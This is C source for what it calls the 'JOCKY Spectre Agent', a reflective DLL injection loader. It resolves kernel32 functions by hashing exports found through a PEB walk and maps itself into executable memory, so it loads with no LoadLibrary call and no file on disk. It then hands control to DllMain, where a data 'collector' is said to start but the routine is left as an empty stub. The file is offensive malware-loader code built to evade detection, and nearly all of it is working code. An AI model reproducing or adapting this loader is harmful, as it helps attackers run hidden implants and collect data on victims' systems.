/*
 * JOCKY Spectre Agent — Reflective DLL Injection
 * Self-loading DLL that resolves imports via PEB traversal.
 * Zero LoadLibrary/LdrLoadDll calls. No file on disk.
 *
 * Compiled with: cl /O2 /GS- /LD rdll.c /link /ENTRY:ReflectiveLoader
 */

#include <windows.h>
#include <winternl.h>

#define DEREF(name) *(UINT_PTR *)(name)
#define DEREF_32(name) *(DWORD *)(name)
#define DEREF_16(name) *(WORD *)(name)

typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR);
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);

typedef struct _REFLECTIVE_CTX {
    LOADLIBRARYA    pLoadLibraryA;
    GETPROCADDRESS  pGetProcAddress;
    VIRTUALALLOC    pVirtualAlloc;
} REFLECTIVE_CTX;

/* Hash function for export name resolution */
static DWORD hash_function_name(const char *name) {
    DWORD hash = 0;
    while (*name) {
        hash = ((hash << 5) + hash) + *name++;
    }
    return hash;
}

/* Walk PEB → LDR → InMemoryOrderModuleList to find kernel32 and ntdll.
 * Resolves LoadLibraryA, GetProcAddress, VirtualAlloc from their EATs. */
static BOOL resolve_imports(REFLECTIVE_CTX *ctx) {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif

    PLIST_ENTRY head  = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    HMODULE hKernel32 = NULL;
    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
            entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        /* Find kernel32.dll by walking EAT for known export hashes */
        if (mod->DllBase) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod->DllBase;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)
                    ((BYTE*)mod->DllBase + dos->e_lfanew);
                PIMAGE_DATA_DIRECTORY expDir =
                    &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

                if (expDir->Size) {
                    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)
                        ((BYTE*)mod->DllBase + expDir->VirtualAddress);
                    PDWORD names = (PDWORD)((BYTE*)mod->DllBase + exports->AddressOfNames);

                    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
                        LPCSTR fname = (LPCSTR)((BYTE*)mod->DllBase + names[i]);
                        if (hash_function_name(fname) == 0x0726774C) { /* LoadLibraryA */
                            hKernel32 = (HMODULE)mod->DllBase;
                            PDWORD funcs = (PDWORD)((BYTE*)mod->DllBase + exports->AddressOfFunctions);
                            PWORD ords   = (PWORD)((BYTE*)mod->DllBase + exports->AddressOfNameOrdinals);
                            ctx->pLoadLibraryA = (LOADLIBRARYA)
                                ((BYTE*)mod->DllBase + funcs[ords[i]]);
                            break;
                        }
                    }
                }
            }
        }
        entry = entry->Flink;
    }

    if (!hKernel32) return FALSE;

    /* Resolve remaining imports from kernel32 */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hKernel32;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)hKernel32 + dos->e_lfanew);
    PIMAGE_DATA_DIRECTORY expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)hKernel32 + expDir->VirtualAddress);
    PDWORD names = (PDWORD)((BYTE*)hKernel32 + exports->AddressOfNames);
    PDWORD funcs = (PDWORD)((BYTE*)hKernel32 + exports->AddressOfFunctions);
    PWORD  ords  = (PWORD)((BYTE*)hKernel32 + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        LPCSTR fname = (LPCSTR)((BYTE*)hKernel32 + names[i]);
        DWORD h = hash_function_name(fname);
        if (h == 0x7C0DFCAA)  /* GetProcAddress */
            ctx->pGetProcAddress = (GETPROCADDRESS)((BYTE*)hKernel32 + funcs[ords[i]]);
        else if (h == 0x91AFCA54)  /* VirtualAlloc */
            ctx->pVirtualAlloc = (VIRTUALALLOC)((BYTE*)hKernel32 + funcs[ords[i]]);
    }

    return (ctx->pGetProcAddress && ctx->pVirtualAlloc);
}

/* Reflective loader entry point. Called from injected memory region.
 * Walks its own PE headers, resolves imports, applies relocations,
 * then calls DllMain. */
DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    REFLECTIVE_CTX ctx = {0};
    if (!resolve_imports(&ctx)) return 1;

    /* Find our own base by scanning backwards from current RIP */
    ULONG_PTR base = (ULONG_PTR)ReflectiveLoader;
    while (TRUE) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE)
                break;
        }
        base--;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    /* Allocate memory at preferred base for the loaded image */
    LPVOID mapped = ctx.pVirtualAlloc(
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!mapped) {
        mapped = ctx.pVirtualAlloc(
            NULL, nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!mapped) return 1;

    /* Copy headers */
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        ((BYTE*)mapped)[i] = ((BYTE*)base)[i];

    /* Copy sections */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        BYTE *dest = (BYTE*)mapped + section[i].VirtualAddress;
        BYTE *src  = (BYTE*)base + section[i].PointerToRawData;
        for (DWORD j = 0; j < section[i].SizeOfRawData; j++)
            dest[j] = src[j];
    }

    /* Apply relocations */
    ULONG_PTR delta = (ULONG_PTR)mapped - nt->OptionalHeader.ImageBase;
    if (delta) {
        PIMAGE_DATA_DIRECTORY relocDir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)
            ((BYTE*)mapped + relocDir->VirtualAddress);
        while (reloc->VirtualAddress) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD entries = (PWORD)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD j = 0; j < count; j++) {
                if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR *patch = (ULONG_PTR*)
                        ((BYTE*)mapped + reloc->VirtualAddress + (entries[j] & 0xFFF));
                    *patch += delta;
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    /* Resolve imports */
    PIMAGE_DATA_DIRECTORY impDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)
        ((BYTE*)mapped + impDir->VirtualAddress);

    while (imp->Name) {
        LPCSTR dllName = (LPCSTR)((BYTE*)mapped + imp->Name);
        HMODULE hDll   = ctx.pLoadLibraryA(dllName);
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)
            ((BYTE*)mapped + imp->FirstThunk);

        while (thunk->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)
                ((BYTE*)mapped + thunk->u1.AddressOfData);
            thunk->u1.Function = (ULONG_PTR)ctx.pGetProcAddress(hDll, ibn->Name);
            thunk++;
        }
        imp++;
    }

    /* Call DllMain — collector begins */
    DLLMAIN dllMain = (DLLMAIN)((BYTE*)mapped + nt->OptionalHeader.AddressOfEntryPoint);
    dllMain((HINSTANCE)mapped, DLL_PROCESS_ATTACH, lpParameter);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        /* Collector starts here — dispatch to collection routines */
    }
    return TRUE;
}
